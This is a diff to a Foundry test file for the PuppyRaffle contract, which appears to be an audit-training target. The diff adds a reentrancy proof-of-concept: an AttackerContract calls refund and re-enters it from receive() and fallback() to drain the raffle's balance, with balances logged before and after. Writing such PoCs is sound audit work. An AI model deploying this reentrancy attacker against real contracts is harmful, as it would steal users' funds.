@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.7.6;
 pragma experimental ABIEncoderV2;
-
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
@@ -212,5 +211,62 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    function test_reentrancyRefund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        address attackerUser = makeAddr("attackerUser");
+        vm.deal(attackerUser, 1 ether);
+        vm.prank(attackerUser);
+
+
+        AttackerContract attackerContract = new AttackerContract(puppyRaffle, entranceFee); 
+
+        console.log("Starting attacker  balance: ", address(attackerContract).balance);
+        console.log("Starting victim balance: ", address(puppyRaffle).balance);
+
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("Ending attacker  balance: ", address(attackerContract).balance);
+        console.log("Ending victim balance: ", address(puppyRaffle).balance);
+    }
+}
+
+contract AttackerContract {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = _entranceFee;
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+    
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+    fallback() external payable {
+        _stealMoney();
     }
 }
